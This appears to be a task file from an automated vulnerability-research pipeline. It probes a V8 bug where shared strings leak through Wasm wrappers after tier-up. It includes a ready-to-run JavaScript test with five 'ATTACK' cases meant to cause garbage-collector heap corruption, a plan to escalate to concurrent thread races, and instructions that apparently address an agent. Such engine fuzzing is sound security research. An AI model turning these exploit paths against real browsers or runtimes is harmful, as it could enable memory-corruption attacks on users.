# Genome 053 — gc-exploit-shared-leak

## Hypothesis
TC-003/TC-004 confirmed: shared strings leak to JS through the compiled wrapper after tier-up. The shared string object is in writable shared space but JS receives it without unsharing. Can this be exploited for GC corruption?

**Attack vector 1: Concurrent access.** If a shared string is returned to JS without unsharing, JS operates on a shared-space object as if it were local. If another thread (via SharedArrayBuffer worker or Wasm shared memory) accesses the same string, data races can occur during concurrent GC marking.

**Attack vector 2: String mutation.** JS string operations (like String.prototype.replace or string concatenation creating new representations) might trigger representation changes on the shared string. If the GC's concurrent marker is scanning the string while JS mutates its representation, heap corruption can occur.

**Attack vector 3: WeakRef/FinalizationRegistry.** If a leaked shared string is registered in a WeakRef or FinalizationRegistry, the GC might attempt to finalize a shared-space object from a local isolate, violating the shared space GC protocol.

Multi-factor: [shared string leak via compiled wrapper] × [GC concurrent marking] × [string operation triggering representation change] = heap corruption.

## DNA

### Source Facts — GC and Shared Space

The DCHECK at marking-visitor-inl.h:704 that TC-002 found:
```cpp
DCHECK(!HeapLayout::InWritableSharedSpace(key))
```
This fires when a shared-space object appears where the GC doesn't expect one. TC-002 found this for WeakSet.add(sharedWasmStruct). The same pattern may apply to leaked shared strings.

### TC-003 Leak Mechanism
After tier-up, the compiled wrapper returns shared strings as-is:
```cpp
// wrappers-inl.h:161-162 — falls through for non-shared-externref types
if (!type.is_nullable()) return ret;      // returns shared string as-is
if (!type.use_wasm_null()) return ret;    // returns shared string as-is
```

### String Internals
- Strings in V8 have various representations: SeqString, ConsString, SlicedString, ThinString, ExternalString
- GC can migrate strings between representations (e.g., during compaction)
- Shared strings should only be in shared space; local strings should only be in local space
- InWritableSharedSpace check is used by concurrent marker

## Ready-to-Run Test

```javascript
// Flags: --experimental-wasm-shared --allow-natives-syntax --shared-string-table --harmony-struct
load('/Users/t/v8/test/mjsunit/wasm/wasm-module-builder.js');

// Create shared string
let ss = new (new SharedStructType(['s']));
ss.s = 'gc-exploit-test-string-that-is-long-enough-to-not-be-internalized';
let sharedStr = ss.s;

function tierUp(fn, arg) { for (let i = 0; i < 15000; i++) fn(arg); }

// Build Wasm module that leaks shared strings via non-shared externref
let b = new WasmModuleBuilder();
b.addFunction('leak', makeSig([kWasmExternRef], [kWasmExternRef]))
  .addBody([kExprLocalGet, 0]).exportFunc();
let inst = b.instantiate();

// Tier up to trigger compiled wrapper
tierUp(inst.exports.leak, sharedStr);

// Now the compiled wrapper returns shared strings without unsharing
let leaked = inst.exports.leak(sharedStr);
print('leaked isShared: ' + %IsSharedString(leaked));

// ATTACK 1: WeakRef on leaked shared string
try {
  let wr = new WeakRef(leaked);
  print('WeakRef created on leaked shared string: ' + (wr.deref() !== undefined));
  // Force GC to process the WeakRef
  %CollectGarbage('major');
  %CollectGarbage('major');
  print('After GC, WeakRef alive: ' + (wr.deref() !== undefined));
} catch(e) { print('WeakRef ERROR: ' + e.message); }

// ATTACK 2: FinalizationRegistry on leaked shared string
try {
  let fr = new FinalizationRegistry((held) => {
    print('Finalized: ' + held);
  });
  fr.register(leaked, 'shared-string-leaked');
  leaked = null;
  %CollectGarbage('major');
  %CollectGarbage('major');
  print('FinalizationRegistry: registered and GC triggered');
} catch(e) { print('FinalizationRegistry ERROR: ' + e.message); }

// ATTACK 3: String operations on leaked shared string
try {
  leaked = inst.exports.leak(sharedStr);
  // Trigger string operations that may change representation
  let concat = leaked + '-suffix';
  let slice = leaked.slice(0, 10);
  let replaced = leaked.replace('test', 'EXPLOIT');
  print('String ops: concat=' + concat.length + ' slice=' + slice + ' replaced=' + replaced.substring(0, 20));
  // Force GC during string operations
  %CollectGarbage('major');
  print('String ops + GC: no crash');
} catch(e) { print('String ops ERROR: ' + e.message); }

// ATTACK 4: WeakMap with leaked shared string as key
try {
  leaked = inst.exports.leak(sharedStr);
  let wm = new WeakMap();
  wm.set(leaked, 'value');
  print('WeakMap.set with leaked shared string: success');
  %CollectGarbage('major');
  print('After GC: ' + wm.get(leaked));
} catch(e) { print('WeakMap ERROR: ' + e.message); }

// ATTACK 5: Multiple leaked strings + heavy GC
try {
  let arr = [];
  for (let i = 0; i < 1000; i++) {
    let s = new (new SharedStructType(['s']));
    s.s = 'str-' + i + '-padding-to-avoid-internalization-' + Math.random();
    arr.push(inst.exports.leak(s.s));
  }
  print('Created 1000 leaked shared strings');
  %CollectGarbage('major');
  %CollectGarbage('minor');
  %CollectGarbage('major');
  print('Heavy GC after leaking 1000 strings: no crash');
  // Check if any became corrupted
  let corrupted = 0;
  for (let i = 0; i < arr.length; i++) {
    if (typeof arr[i] !== 'string') corrupted++;
  }
  print('Corrupted strings: ' + corrupted);
} catch(e) { print('Heavy GC ERROR: ' + e.message); }
```

## Evolution Plan
- v1: Run the GC exploitation test. Check for crashes, DCHECK failures, or corruption.
- v2: If no crash, try concurrent access patterns: use SharedArrayBuffer + Atomics to coordinate two threads accessing the same leaked string while GC runs.
- v3: If still no crash, audit the GC code paths for shared-space objects — find where the GC assumes objects in shared space have certain properties.

## Task
Run the test first. Save to /tmp and execute. Post ALL output. Any crash or DCHECK failure is a confirmed exploit.

Post with tags `gc-exploit,shared-string,leak,weakref,finalization,tc-003`.
